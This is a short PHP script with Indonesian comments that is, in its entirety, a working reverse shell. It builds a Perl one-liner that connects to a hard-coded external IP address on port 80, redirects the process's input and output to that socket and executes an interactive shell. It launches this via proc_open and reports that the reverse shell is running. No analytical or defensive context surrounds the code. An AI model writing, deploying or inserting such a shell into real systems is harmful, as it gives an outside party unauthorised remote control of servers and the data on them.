<?php
// Jalankan reverse shell menggunakan perl
$cmd = "perl -e 'use Socket;\$i=\"157.245.203.223\";\$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";

// Gunakan proc_open agar bisa mengontrol output/error (opsional)
$descriptorspec = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];

$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    echo "Reverse shell sedang dijalankan...";
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
} else {
    echo "Gagal membuka proses.";
}
?>
